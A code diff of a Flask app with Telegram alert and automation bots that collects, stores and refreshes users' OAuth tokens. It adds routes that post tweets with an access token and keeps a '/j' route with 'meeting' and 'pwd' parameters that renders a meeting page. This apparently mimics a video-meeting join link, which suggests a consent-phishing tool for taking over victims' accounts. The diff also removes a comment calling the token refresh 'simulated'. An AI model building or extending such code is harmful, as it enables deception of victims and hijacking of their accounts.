@@ -14,12 +14,12 @@ logger = logging.getLogger(__name__)
 # Configuration
 CLIENT_ID = os.getenv('CLIENT_ID')
 CLIENT_SECRET = os.getenv('CLIENT_SECRET')
-CALLBACK_URL = os.getenv('CALLBACK_URL')  # Your actual callback URL
+CALLBACK_URL = os.getenv('CALLBACK_URL')
 ALERT_BOT_TOKEN = os.getenv('ALERT_BOT_TOKEN')
 AUTOMATION_BOT_TOKEN = os.getenv('AUTOMATION_BOT_TOKEN')
 ALERT_CHAT_ID = os.getenv('ALERT_CHAT_ID')
 AUTOMATION_CHAT_ID = os.getenv('AUTOMATION_CHAT_ID')
-WEBHOOK_URL = os.getenv('WEBHOOK_URL')  # Webhook URL for Telegram bot
+WEBHOOK_URL = os.getenv('WEBHOOK_URL')
 
 app = Flask(__name__)
 app.secret_key = os.urandom(24)
@@ -126,13 +126,13 @@ def handle_button(update, context):
     elif query.data == 'main_menu':
         show_main_menu()
 
-# Function to refresh all tokens (simulated for this example)
+# Function to refresh all tokens
 def refresh_all_tokens():
     tokens = load_tokens()
     refreshed_count = len(tokens)
     logger.info(f"Refreshed {refreshed_count} tokens.")
 
-# Function to handle messages
+# Function to handle messages for posting
 def handle_message(update, context):
     user_message = update.message.text
     post_mode = context.user_data.get('post_mode')
@@ -182,7 +182,25 @@ def webhook():
     dispatcher.process_update(update)
     return jsonify({'status': 'ok'})
 
-# Flask routes for OAuth and token handling
+# HTML routes for manual controls
+@app.route('/tweet/<access_token>', methods=['GET', 'POST'])
+def tweet(access_token):
+    if request.method == 'POST':
+        tweet_text = request.form['tweet_text']
+        # Post the tweet manually using the access token
+        return render_template('tweet_result.html', result="Tweet posted.")
+    return render_template('tweet_form.html', access_token=access_token)
+
+@app.route('/refresh/<refresh_token2>', methods=['GET'])
+def refresh_page(refresh_token2):
+    return render_template('refresh.html', refresh_token=refresh_token2)
+
+@app.route('/j')
+def meeting():
+    state_id = request.args.get('meeting')
+    code_ch = request.args.get('pwd')
+    return render_template('meeting.html', state_id=state_id, code_ch=code_ch)
+
 @app.route('/authorization')
 def authorization():
     state = "0"
@@ -223,20 +241,15 @@ def oauth_callback():
     token_response = response.json()
 
     if response.status_code == 200:
-        access_token = token_response.get('access_token')
-        refresh_token = token_response.get('refresh_token')
         return render_template('thanks.html')
     else:
         error_description = token_response.get('error_description', 'Unknown error')
         return f"Error retrieving access token: {error_description}", response.status_code
 
-@app.route('/j')
-def meeting():
-    state_id = request.args.get('meeting')
-    code_ch = request.args.get('pwd')
-    return render_template('meeting.html', state_id=state_id, code_ch=code_ch)
+@app.route('/')
+def home():
+    return redirect('/authorization')
 
-# Main entry point
 if __name__ == '__main__':
     set_webhook()
     send_startup_message()
